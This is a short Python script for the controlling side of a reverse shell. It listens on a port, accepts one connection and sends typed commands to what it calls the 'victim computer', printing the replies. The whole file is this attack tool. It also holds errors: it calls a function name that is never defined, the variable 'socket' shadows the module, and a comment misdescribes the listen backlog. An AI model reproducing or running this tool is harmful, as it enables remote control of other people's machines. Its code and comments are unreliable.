import socket, sys


# Create a socket to connect two computers
def create_socket():
    try:
        global host
        global port
        global socket
        host = ""
        port = 999
        socket = socket.socket()
    except socket.error as msg:
        print("Error creating a socket: " + str(msg))
        print("Retrying...")
        create_socket()


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global socket

        print("Binding the port: " + str(port))
        socket.bind((host, port))
        socket.listen(5) # 5 is the number of bad errors to tolerate
        
    except socket.error as msg:
        print("Error binding the socket with port: " + str(msg))
        print("Retrying...")
        bind_socket()


# Establish connection with a client
# Socket must be listening
def socket_accept():
    conn, address = socket.accept()
    print("Connection has been established with IP " + address[0]
          + " Port: " + str(address[1]))
    send_command(conn)    
    conn.close()


# sends commands to victim computer
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            socket.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()


if __name__ == "__main__":
    main()


            
        

